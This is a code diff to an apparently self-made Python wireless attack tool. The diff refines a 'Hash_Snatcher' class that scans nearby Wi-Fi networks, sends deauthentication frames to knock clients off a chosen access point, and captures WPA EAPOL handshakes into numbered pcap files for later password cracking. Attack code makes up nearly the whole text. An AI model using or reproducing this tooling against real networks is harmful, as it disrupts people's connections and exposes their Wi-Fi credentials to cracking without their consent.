@@ -27,6 +27,7 @@ import threading, os, random, time, pyttsx3, subprocess, json
 from pathlib import Path
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from textwrap import dedent
+from datetime import datetime
 
 
 # THREAD LOCKER
@@ -1350,7 +1351,7 @@ class Hash_Snatcher():
                 addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
 
                 channel = Background_Threads.get_channel(pkt=pkt)
-                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
+                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Hidden SSID"
                 
 
 
@@ -1358,7 +1359,7 @@ class Hash_Snatcher():
                 if addr2 and ssid not in cls.ssids:
 
                     console.print(f"[bold red][+] SSID Found:[bold yellow] {ssid}")
-                    cls.ssids.append(ssid); cls.mac_ifo.append((ssid, addr2, channel))
+                    cls.ssids.append(ssid); cls.mac_ifo.append((len(cls.ssids), ssid, addr2, channel))
     
 
         sniffer()
@@ -1371,7 +1372,7 @@ class Hash_Snatcher():
 
         
         max = len(cls.ssids)
-        console.print(cls.ssids)
+        console.print(cls.mac_ifo)
 
                 
         while True:
@@ -1381,11 +1382,12 @@ class Hash_Snatcher():
     
                 
                 if 1 <= choice <= max: 
-                    ssid    = cls.mac_ifo[choice][0]
-                    bssid   = cls.mac_ifo[choice][1]
-                    channel = cls.mac_ifo[choice][2]
+                    num     = cls.mac_ifo[choice][0]; num -= 1
+                    ssid    = cls.mac_ifo[choice][1]
+                    bssid   = cls.mac_ifo[choice][2]
+                    channel = cls.mac_ifo[choice][3]
 
-                    console.print(f"\n[bold green][+] Target -->[bold yellow] {cls.ssids[choice]}"); return ssid, bssid, channel
+                    console.print(f"\n[bold green][+] Target -->[bold yellow] {cls.ssids[num]}"); return ssid, bssid, channel
 
             
             except (KeyError, TypeError) as e: console.print(f"[bold red][-]Error:[bold yellow] {e}")
@@ -1396,7 +1398,7 @@ class Hash_Snatcher():
 
     
     @classmethod
-    def _target_attacker(cls, iface, target, client="ff:ff:ff:ff:ff:ff", verbose=True, delay=5):
+    def _target_attacker(cls, iface, target, client="ff:ff:ff:ff:ff:ff", verbose=False, delay=5):
         """This will send deauth packets to AP clients"""
 
   
@@ -1410,7 +1412,7 @@ class Hash_Snatcher():
             frames.append(frame)
             console.print(f"[bold green]Frame created:[/bold green] {frame}")
 
-        print('\n')
+        print('\n'); time.sleep(2)
         while cls.sniff:
                 
             try:
@@ -1425,10 +1427,9 @@ class Hash_Snatcher():
 
             except KeyboardInterrupt as e: console.print(f"[bold red]target_attacker module Error:[bold yellow] {e}"); cls.sniff  = False; break
             
-            except Exception as e: console.print(f"[bold red]target_attacker module Exception Error:[bold yellow] {e}")
+            except Exception as e:         console.print(f"[bold red]target_attacker module Exception Error:[bold yellow] {e}")
     
 
-        time.sleep(2)
         console.print("\n --- DEAUTH ENDED --- ", style="bold red")
 
 
@@ -1441,7 +1442,7 @@ class Hash_Snatcher():
         stay = True
         handshake = False
         eapol_frames = []
-        time.sleep(2.5)
+        time.sleep(.5)
         
         
         def sniffer(stay=stay, handshake=handshake):
@@ -1473,8 +1474,41 @@ class Hash_Snatcher():
             
 
             console.print("\n ---  HASH SNIFF ENDED  --- ", style="bold red")
-
         
+
+
+        def file_enumerator(path, ssid, verbose=True):
+            """This will find a valid file path and store name of ssid for file path in txt"""
+
+            num = 1
+            txt_path = path / "verbose.txt"
+            file = path / f"handshake_{num}.pcap"
+            
+            while True:
+
+                if not file.exists():
+                    
+                    #time_stamp = da
+                    message = f"[+] Handshake Capture - SSID: {ssid}"
+
+
+                    try:
+
+                        pass
+
+                      # with open(txt_path, "a") as f:
+                          #  f.write() 
+                    
+                    
+                    except (FileNotFoundError, FileExistsError) as e: console.print(f"[bold red][-] File Error:[bold yellow] {e}")
+                    except Exception as e: console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")
+
+                    if verbose: console.print(f"[bold yellow][*] File --> {file}")
+                    return file
+
+
+                num += 1;  file = path / f"handshake_{num}.pcap"
+
 
         def parser(pkt, handshake=handshake):
             """This will parse that hoe"""
@@ -1484,9 +1518,9 @@ class Hash_Snatcher():
             # ADDR2 AND ADDR3 == SRC
 
 
-            if handshake: return KeyboardInterrupt
+            if handshake: console.print(pkt); return KeyboardInterrupt
 
-            if pkt.haslayer(EAPOL): 
+            if not handshake and pkt.haslayer(EAPOL): 
 
 
                 addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
@@ -1498,10 +1532,16 @@ class Hash_Snatcher():
                 if addr2: console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")
 
                 cls.SNIFF = False
-                handshake = "" 
+                handshake = pkt
                 eapol_frames.append(pkt)
-                path = str(Path(__file__).parent.parent / "hashes"); file = path / "handshake.pcap"
-                wrpcap(str(file), eapol_frames)
+
+                USER_HOME = Path(os.getenv("SUDO_USER") and f"/home/{os.getenv('SUDO_USER')}") or Path.home()
+                path = USER_HOME / "Documents" / "nsm_tools" / "netcracker" / "hashes"; path.mkdir(exist_ok=True, parents=True)
+                #file = path / "handshake.pcap"; console.print("[bold green][+] path created")
+
+                file = file_enumerator(path=path, ssid="N/A")
+
+                wrpcap(str(file), eapol_frames); console.print("[bold green][+] pushed file")
 
 
 
